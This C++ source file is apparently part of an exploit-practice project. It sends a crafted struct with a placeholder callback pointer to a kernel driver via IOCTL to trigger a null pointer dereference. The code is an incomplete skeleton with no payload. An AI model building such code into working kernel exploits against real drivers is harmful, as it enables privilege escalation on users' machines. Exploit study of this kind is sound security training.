#include "NullPointerDereference.h"

bool 
ExploitNullPointerDereference::exploit() {
	
	static const DWORD Uninitialized_Magic_Value = 0xBAD0B0B0;
	
	struct NullPtrObject {
		DWORD someValue;
		PVOID callback;
	};
	
	NullPtrObject obj {
		0x11223344,
		reinterpret_cast<PVOID>(0xAABBCCDD)
	};
	
	bool ret = driver.SendIOCTL (
		ExploitNullPointerDereference::Ioctl_Code,
		&obj,
		sizeof(NullPtrObject)
	);
	
	return ret;
}
